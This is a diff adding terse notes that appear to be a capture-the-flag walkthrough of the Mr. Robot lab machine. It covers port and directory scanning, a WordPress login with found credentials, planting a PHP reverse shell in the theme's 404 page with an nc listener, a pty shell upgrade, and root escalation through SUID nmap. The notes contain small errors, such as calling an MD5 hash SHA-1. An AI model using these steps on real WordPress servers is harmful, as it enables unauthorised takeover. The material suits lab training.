@@ -1,0 +1,62 @@
+**Enumeration** 
+
+cd /opt/EZEA
+sudo ./runme.sh target_ip_address
+
+#also run
+nmap target_ip_address -sV 
+
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+
+#also run ferroxbuster
+cd /opt/ferroxbuster
+feroxbuster -u http://target_ip_address
+feroxbuster -u https://target_ip_address
+
+#open browser target_ip_address
+
+#inspect page sources and find wp
+target_ip_address/wp-content/
+target_ip_address/robots/
+target_ip_address/license/ #based encoded message ER28-0652 at bottom of page (password)
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+#get information from sites
+curl -s http://target_ip_address/key-1-of-3.txt
+curl -s http://target_ip_address/fsocity.txt > fsocity.txt
+
+#password for elliot on target_ip_address/wp-login.php
+elliot:ER28-0652
+
+#Once we login to admin page, navigate to appearances > editor and upload the contents of php-reverse-shell.php to the 404.php page. 
+#open terminal on attacker machine and type nc -nlvp 1234
+#open target_ip_address/404.php
+
+#navigate to files
+cat password.raw-md5 #contents are a sha-1 password.  
+decodes to - abcdefghijklmnopqrstuvwxyz
+robot:c3fcd3d76192e4007dfb496cca67e13b 
+python -c 'import pty; pty.spawn("/bin/sh")'
+#We can also get the second key from here by traversing the directories. 
+
+
+#upgrade user to robot
+su - robot 
+
+
+#Check user permissions
+find / -user root -perm -4000 -print 2>/dev/null
+#nmap is out of the ordinary and allows us to run root permissions 
+nmap --interactive
+!whoami
+!ls /root
+!cat /root/key-3-of-3.txt
+
+
+
+
